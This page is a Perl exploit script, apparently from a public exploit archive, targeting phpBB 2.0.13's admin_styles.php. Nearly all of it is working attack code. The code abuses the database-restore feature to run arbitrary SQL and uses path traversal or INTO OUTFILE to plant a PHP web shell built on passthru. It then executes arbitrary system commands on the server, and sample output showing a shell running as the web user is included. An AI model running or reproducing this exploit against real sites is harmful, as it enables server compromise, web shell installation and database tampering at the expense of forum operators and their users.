<html><head><title>phpBB 2.0.13 (admin_styles.php) Remote Command Execution Exploit</title></head><pre>#!/usr/bin/perl

### r57phpbb_admin2exec.pl                                                      
### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### phpBB admin_styles.php commands execution exploit                           
### tested on phpBB 2.0.13                                                      
### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### by 1dt.w0lf                                                                 
### RST/GHC                                                                     
### http://rst.void.ru                                                          
### http://ghc.ru                                                               
### ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
### screen
### r57phpbb_admin2exec.pl -p http://blah.com/phpBB/admin/ -s 0864cb0abb396319c589ebc2a98c2c5d -c get_prefix
### -----------------------------------------------------------------------------------
### [~] Try to get prefix ...[ DONE ]
### PREFIX : phpbb_
### -----------------------------------------------------------------------------------
### 
### r57phpbb_admin2exec.pl -p http://blah.com/phpBB/admin/ -s 0864cb0abb396319c589ebc2a98c2c5d -P phpbb_
### -----------------------------------------------------------------------------------
### [!] Method 2 - use &quot;create\export style&quot;
### [~] Try to run sql query in database ... [ DONE ]
### [~] Creating new style ... [ DONE ]
### [~] Creating file ... [ DONE ]
### [+] File successfully created! Now you can try execute command!
### [~] Delete style from database ... [ DONE ]
### -----------------------------------------------------------------------------------
### 
### r57phpbb_admin2exec.pl -p http://blah.com/phpBB/admin/ -s 0864cb0abb396319c589ebc2a98c2c5d -c &quot;uname -sr; id&quot;
### -----------------------------------------------------------------------------------
### FreeBSD 5.3-RELEASE
### uid=80(www) gid=80(www) groups=80(www)
### -----------------------------------------------------------------------------------
### 20.04.2005

use LWP::UserAgent;
use Getopt::Std;

getopts(&quot;p:s:P:c:m:&quot;);

$path   = $opt_p;
$sid    = $opt_s;
$prefix = $opt_P || 'phpbb_'; 
$cmd    = $opt_c || 'create'; 
$method = $opt_m || 2;        

#################### LITTLE CONFIG
# forum on win or unix? commands split by ; or &amp;&amp;
$cmdspl = ';'; # unix
# filename for create. default is 'theme_info.cfg' for include in admin_styles.php?mode=addnew
# DONT CHANGE if you don't know that you do!!!
$filename = '/theme_info.cfg';
# folder for create file, we need folder writable for apache user, by default we use /tmp
$dir = '../../../../../../../../../../../../../../../../../../../../../tmp';
#################### END CONFIG

if(!$path || !$sid) { &amp;usage; }

$xpl = LWP::UserAgent-&gt;new() or die;

if($cmd eq 'clear')
 {
 &amp;show_header;
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 print &quot;[~] Clearing database ... &quot;;
 $sql = 'DELETE FROM `'.$prefix.'themes` WHERE style_name=&quot;&quot; AND template_name=&quot;&quot;;'; 
 $suc = &amp;phpbb_sql_query(&quot;${path}admin_db_utilities.php?sid=$sid&quot;,$sql);
 if(!$suc) { print &quot; [ FAILED ]\n&quot;; exit(); }
 if($suc == 1) { print &quot; [ DONE ]\n&quot;; }
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 exit();
 }

if($cmd eq 'create' &amp;&amp; $method == 1)
 {
 &amp;show_header;
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 print &quot;[!] Method 1 - use \&quot;INTO OUTFILE\&quot;\n&quot;;
 print &quot;[!] Create file for including.\n&quot;;
 print &quot;[~] Try to run sql query in database...&quot;;
 $sql   = 'SELECT \'&lt;? passthru($_POST[jagajaga]); ?&gt;\' FROM '.$prefix.'users LIMIT 1 INTO OUTFILE \''.$dir.$filename.'\';';
 $suc = &amp;phpbb_sql_query(&quot;${path}admin_db_utilities.php?sid=$sid&quot;,$sql);
 if(!$suc) { print &quot; [ FAILED ]\n&quot;; exit(); }
 if($suc == 2) { print &quot; [ DONE ]\n[!] File already exists! Now you can try execute command!\n&quot;; }
 if($suc == 1) { print &quot; [ DONE ]\n[+] File successfully created! Now you can try execute command!\n&quot;; }
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 exit();
 }

if($cmd eq 'get_prefix')
 {
 &amp;show_header;
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 print &quot;[~] Try to get prefix ...&quot;;
 $res = $xpl-&gt;get(
 &quot;${path}admin_db_utilities.php?perform=backup&amp;additional_tables=&amp;backup_type=structure&amp;drop=0&amp;backupstart=1&amp;gzipcompress=0&amp;startdownload=1&amp;sid=$sid&quot;
 );
 if($res-&gt;is_success &amp;&amp; $res-&gt;content =~ /(TABLE: )(.*)(auth_access)/)
  { 
  $prefix = ($2)?($2):(&quot;No prefix&quot;);
  print &quot;[ DONE ]\nPREFIX : $prefix\n&quot;; 
  }
 else { print &quot;[ FAILED ]\n&quot;; }
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 exit(0);
 }

if($cmd eq 'create' &amp;&amp; $method == 2)
 {
 &amp;show_header;
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 print &quot;[!] Method 2 - use \&quot;create\\export style\&quot;\n&quot;;
 print &quot;[~] Try to run sql query in database ...&quot;;
 $sql   = 'ALTER TABLE `'.$prefix.'themes` CHANGE `template_name` `template_name` VARCHAR( 255 ) NOT NULL;';
 $suc = &amp;phpbb_sql_query(&quot;${path}admin_db_utilities.php?sid=$sid&quot;,$sql);
 if(!$suc) { print &quot; [ FAILED ]\n&quot;; exit(); }
 if($suc == 1) { print &quot; [ DONE ]\n&quot;; }
 print &quot;[~] Creating new style ...&quot;;
 $res = $xpl-&gt;post(
  &quot;${path}admin_styles.php?sid=$sid&quot;,
  [
    'style_name'    =&gt; '0wn',
    'template_name' =&gt; 'a=12;passthru($_POST[jagajaga]);exit(0);//'.$dir,
    'mode'          =&gt; 'create',
    'submit'        =&gt; 'Save Settings'
  ],
 );
 if($res-&gt;is_success){ print &quot; [ DONE ]\n[~] Creating file ...&quot;; }
 else { print &quot; [ FAILED ]\n&quot;; exit(0); }
 $res = $xpl-&gt;post(
  &quot;${path}admin_styles.php?sid=$sid&quot;,
  [
    'export_template' =&gt; 'a=12;passthru($_POST[jagajaga]);exit(0);//'.$dir,
    'mode'            =&gt; 'export',
    'edit'            =&gt; 'Submit'
  ],
 );
 if($res-&gt;is_success) { print &quot; [ DONE ]\n[+] File successfully created! Now you can try execute command!\n&quot;; }
 else { print &quot; [ FAILED ]\n&quot;; exit(0); }
 print &quot;[~] Delete style from database ...&quot;;
 $sql   = 'DELETE FROM `'.$prefix.'themes` WHERE style_name=&quot;0wn&quot;;';
 &amp;phpbb_sql_query(&quot;${path}admin_db_utilities.php?sid=$sid&quot;,$sql);
 print &quot; [ DONE ]\n&quot;;
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 exit(0);
 }

$jagajaga  = 'echo _GHC/RST_ ';
$jagajaga .= $cmdspl;
$jagajaga .= $cmd;
$jagajaga .= $cmdspl;
$jagajaga .= ' echo _GHC/RST_';

$res = $xpl-&gt;post(
 &quot;${path}admin_styles.php?mode=addnew&amp;sid=${sid}&amp;install_to=${dir}&quot;,
  [
  'jagajaga' =&gt; &quot;$jagajaga&quot;
  ]
 );

&amp;show_header;

if($res-&gt;content =~ /main\(\): Failed opening/) { print &quot;[-] Error!\nFailed include file! Maybe you forgot create shell file first?\n&quot;; exit(); }

@rez = split(&quot;_GHC/RST_&quot;,$res-&gt;content);
print &quot;-----------------------------------------------------------------------------------\n&quot;;
print @rez[1];
print &quot;-----------------------------------------------------------------------------------\n&quot;;

sub usage(){
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 print &quot;          phpBB admin_styles.php command execution exploit by 1dt.w0lf\n&quot;;
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 print &quot;Usage: $0 [options]\n&quot;;
 print &quot;\nOptions:\n\n&quot;;
 print &quot; -p  path to phpBB admin interface e.g. http://site.com/phpBB/admin/\n\n&quot;;
 print &quot; -s  admin sid ... yeeesss you need admin rights for use this exploit =)\n\n&quot;;
 print &quot; -P  database prefix (optional) default \&quot;phpbb_\&quot;\n\n&quot;;
 print &quot; -c  [create|clear|get_prefix|(any unix/win command)]\n\n&quot;;
 print &quot;     \&quot;create\&quot; for first create shell *default\n&quot;;
 print &quot;     \&quot;clear\&quot; for delete our NULL styles from database\n&quot;;
 print &quot;     \&quot;get_prefix\&quot; get table prefix\n&quot;;
 print &quot;     \&quot;any unix or win commands\&quot; for commands execute =)\n\n&quot;; 
 print &quot; -m  method [1|2] (optional) default \&quot;2\&quot;\n\n&quot;;
 print &quot;     1 - use mysql function \&quot;INTO OUTFILE\&quot; for creating new file\n&quot;;
 print &quot;     2 - use phpBB functions \&quot;create style\&quot; and \&quot;export style\&quot; for create new file\n&quot;;
 print &quot;-----------------------------------------------------------------------------------\n&quot;;
 print &quot;           RST/GHC private stuff , http://rst.void.ru , http://ghc.ru\n&quot;;
 exit();
}

sub show_header()
{
print &quot;-----------------------------------------------------------------------------------\n&quot;;
print &quot;          phpBB admin_styles.php command execution exploit by RST/GHC\n&quot;;
print &quot;-----------------------------------------------------------------------------------\n&quot;;
}

sub phpbb_sql_query($$){
$res = $xpl-&gt;post(&quot;$_[0]&quot;, 
Content_type =&gt; 'form-data',
Content      =&gt; [ 
                perform       =&gt; 'restore',
                restore_start =&gt; 'Start Restore',
                backup_file   =&gt; [ 
                                   undef,
                                   '0wneeeeedddd', 
                                   Content_type =&gt; 'text/plain',
                                   Content =&gt; &quot;$_[1]&quot;, 
                                 ],
                ]
);
if ($res-&gt;is_success)
 {
 if ($res-&gt;content =~ /already exists/) { return 2; }
 if ($res-&gt;content =~ /The Database has been successfully restored/) { return 1; }
 }
return 0;
} 

# milw0rm.com [2005-10-11]</pre></html>